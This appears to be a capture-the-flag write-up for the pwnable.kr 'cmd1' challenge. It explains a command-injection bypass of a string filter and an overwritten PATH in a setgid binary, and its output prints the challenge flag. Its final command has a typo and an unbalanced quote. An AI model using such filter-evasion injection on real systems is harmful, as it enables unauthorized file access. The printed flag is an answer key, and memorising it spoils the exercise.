# cmd1

## Description

```Text
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```

## Analysis

```Shell
$ ssh fd@pwnable.kr -p2222
fd@pwnable.kr's password:
...

Last login: Sun Jun  6 02:43:55 2021 from 111.252.186.121
cmd1@pwnable:~$ ls -al
total 40
drwxr-x---   5 root cmd1     4096 Mar 23  2018 .
drwxr-xr-x 115 root root     4096 Dec 22 08:10 ..
d---------   2 root root     4096 Jul 12  2015 .bash_history
-r-xr-sr-x   1 root cmd1_pwn 8513 Jul 14  2015 cmd1
-rw-r--r--   1 root root      320 Mar 23  2018 cmd1.c
-r--r-----   1 root cmd1_pwn   48 Jul 14  2015 flag
```

Without the permission to the flag, let’s take a look at the source:

```C
cmd1@pwnable:~$ cat cmd1.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}

```

Our input will be used as the entry parameter of the `system()`. So we should think of the following command:

`./cmd1 "cat flag"`

But there are two problems:

- Environment variable

  When we execute `cat`(or another command), the system will find the executable file` cat` from the path specified by the environment variable `PATH`.

  However, the value of the environment variable path has been changed, so we need to use `/bin/cat xxx` instead of `cat xxx`.

- function `filter()`

  The function of filter is to determine whether there is a specific string in our input. If there is, it will be ignored and not executed.

  > Ps: If not filtering string "tmp", we can extract permissions through SUID

  So we need use `"fla"g` instead of `flag` to disable it.

The complete command is as follows:

`./cmd "/bin/cat \"fla\"g`

## Solution

Write-up: [exploit.py](exploit.py)

```Shell
$ python3 exploit.py 
[+] Connecting to pwnable.kr on port 2222: Done
[*] random@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process bytearray(b'./cmd1') on pwnable.kr: pid 228719
[+] Receiving all data: Done (48B)
[*] Stopped remote process 'cmd1' on pwnable.kr (pid 228719)
[+] mommy now I get what PATH environment is for :)
[*] Closed connection to 'pwnable.kr'
```
